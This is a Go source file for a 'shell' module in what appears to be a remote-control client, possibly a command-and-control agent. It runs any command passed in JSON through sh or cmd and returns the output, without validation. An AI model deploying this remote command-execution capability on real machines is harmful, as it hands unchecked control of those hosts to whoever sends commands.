package shell

import (
    "context"
    "encoding/json"
    "fmt"
    "os/exec"
    "runtime"
    
    "github.com/Cl0udRs4/dinot/internal/client/module"
)

// ShellModule implements the Module interface for shell command execution
type ShellModule struct {
    module.BaseModule
}

// ShellParams defines the parameters for shell command execution
type ShellParams struct {
    Command string `json:"command"`
    Timeout int    `json:"timeout,omitempty"` // Timeout in seconds
}

// ShellResult defines the result of shell command execution
type ShellResult struct {
    Success bool   `json:"success"`
    Output  string `json:"output,omitempty"`
    Error   string `json:"error,omitempty"`
}

// NewModule creates a new shell module
func NewModule() module.Module {
    return &ShellModule{
        BaseModule: module.BaseModule{
            Name: "shell",
        },
    }
}

// Execute executes a shell command
func (m *ShellModule) Execute(ctx context.Context, params json.RawMessage) (json.RawMessage, error) {
    var shellParams ShellParams
    err := json.Unmarshal(params, &shellParams)
    if err != nil {
        return nil, fmt.Errorf("failed to parse shell parameters: %w", err)
    }
    
    // Determine the shell to use based on the OS
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.CommandContext(ctx, "cmd", "/C", shellParams.Command)
    } else {
        cmd = exec.CommandContext(ctx, "sh", "-c", shellParams.Command)
    }
    
    // Execute the command
    output, err := cmd.CombinedOutput()
    
    // Prepare the result
    result := ShellResult{
        Success: err == nil,
        Output:  string(output),
    }
    
    if err != nil {
        result.Error = err.Error()
    }
    
    // Marshal the result
    resultBytes, err := json.Marshal(result)
    if err != nil {
        return nil, fmt.Errorf("failed to marshal shell result: %w", err)
    }
    
    return resultBytes, nil
}

// Init initializes the shell module
func (m *ShellModule) Init() error {
    // No special initialization needed
    return nil
}

// Cleanup performs cleanup when the module is unloaded
func (m *ShellModule) Cleanup() error {
    // No special cleanup needed
    return nil
}
